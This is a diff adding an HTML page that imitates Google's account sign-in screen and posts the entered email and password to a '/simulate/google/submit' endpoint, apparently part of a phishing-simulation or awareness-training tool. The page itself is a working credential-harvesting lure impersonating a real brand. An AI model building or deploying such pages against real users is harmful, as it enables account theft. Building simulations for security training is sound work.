@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', sans-serif; background: #fff;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh;
+        }
+        .box {
+            width: 450px; border: 1px solid #dadce0; border-radius: 8px;
+            padding: 48px 40px 36px;
+        }
+        .logo { text-align: center; margin-bottom: 16px; font-size: 28px; font-weight: bold; }
+        .g-blue { color: #4285f4; } .g-red { color: #ea4335; }
+        .g-yellow { color: #fbbc05; } .g-green { color: #34a853; }
+        h1 { font-size: 24px; text-align: center; color: #202124; margin-bottom: 8px; }
+        .sub { text-align: center; color: #5f6368; font-size: 16px; margin-bottom: 30px; }
+        input {
+            width: 100%; padding: 14px 15px; font-size: 16px;
+            border: 1px solid #dadce0; border-radius: 4px; outline: none;
+            margin-bottom: 20px;
+        }
+        input:focus { border-color: #4285f4; border-width: 2px; }
+        .forgot a { color: #1a73e8; font-size: 14px; text-decoration: none; margin-bottom: 20px; }
+        .btn-next {
+            background: #1a73e8; color: #fff; border: none; padding: 10px 24px;
+            border-radius: 4px; font-size: 14px; cursor: pointer; float: right;
+        }
+        .clearfix::after { content: ''; display: table; clear: both; }
+        .footer {
+            margin-top: 40px; padding-top: 20px; border-top: 1px solid #eee;
+            display: flex; justify-content: space-between;
+        }
+        .footer a { color: #5f6368; font-size: 12px; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="logo">
+            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span>
+            <span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+        </div>
+        <h1>Sign in</h1>
+        <p class="sub">Use your Google Account</p>
+        <form method="POST" action="/simulate/google/submit">
+            <input type="email" name="email" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <div class="forgot"><a href="#">Forgot email?</a></div>
+            <div class="clearfix">
+                <a href="#" style="color:#1a73e8; font-size:14px; text-decoration:none; line-height:36px;">Create account</a>
+                <button type="submit" class="btn-next">Next</button>
+            </div>
+        </form>
+        <div class="footer">
+            <a href="#">English</a>
+            <div><a href="#">Help</a> | <a href="#">Privacy</a> | <a href="#">Terms</a></div>
+        </div>
+    </div>
+</body>
+</html>
